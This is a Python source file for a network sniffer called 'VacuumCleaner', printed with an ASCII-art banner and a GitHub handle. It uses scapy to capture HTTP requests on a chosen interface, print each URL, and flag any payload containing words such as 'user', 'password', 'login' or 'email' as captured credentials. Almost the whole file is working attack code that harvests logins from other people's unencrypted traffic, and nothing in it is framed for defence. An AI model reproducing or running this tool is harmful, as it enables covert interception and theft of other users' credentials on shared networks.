import optparse
import scapy.all as scapy
from scapy.layers import http



print("         0000")
print("        0   00")
print("       000    0")
print("      0000    0")
print("      000     0")
print("     000      0")
print("     0        0")
print("    0         0")
print("    0          ")
print("   0         0 ")
print("   0         0 ")
print("  0            ")
print("  0         0  ")
print(" 0          0  ")
print(" 0      0000   ")
print("00     0   00  ")
print("0        00000000\033[1;32m __     __                                ____ _                            \033[0m")
print("       0000000000\033[1;32m \ \   / /_ _  ___ _   _ _   _ _ __ ___  / ___| | ___  __ _ _ __   ___ _ __ \033[0m")
print("0     00000000000\033[1;32m  \ \ / / _` |/ __| | | | | | | '_ ` _ \| |   | |/ _ \/ _` | '_ \ / _ \ '__|\033[0m")
print("      0   000000000\033[1;32m \ V / (_| | (__| |_| | |_| | | | | | | |___| |  __/ (_| | | | |  __/ |   \033[0m")
print("0     00  0000000000 \033[1;32m\_/ \__,_|\___|\__,_|\__,_|_| |_| |_|\____|_|\___|\__,_|_| |_|\___|_| \033[0m")
print("       00 00000000000")
print("  0      000000000000")
print("   0      000000000000")
print("    0     000000000000")
print("    00     00000000000")
print("000000        000000\033[1;32m              Github:https://github.com/unlucky12345\033[0m")
print("00000000")
print("")
print("")

def get_arguments():
    parser= optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Select the interface example:eth0,wlan...")
    (options, arguments) = parser.parse_args()
    if not options.interface:
           parser.error("[-] Please specify an interface use --help for more info. \n[-]Example: python VacuumCleaner.py -i eth0\n[-]Example: python VacuumCleaner.py -i wlan")
    return options

options = get_arguments()

print("\033[1;32m[+]Sniffing with: \033[0m "+ options.interface)

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def sniff_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def sniff_credentials(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        words = ["user", "username", "user_name","pass", "password", "login", "email"]
        for word in words:
            if word in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = sniff_url(packet)
        print("\033[1;36m[*]URL:\033[1;37m" + url)

        credentials = sniff_credentials(packet)
        if credentials:
            print("\033[1;31m[*]Credentials found:\033[1;37m" + credentials)
            print("----------------------------------------------------------")
sniff(options.interface)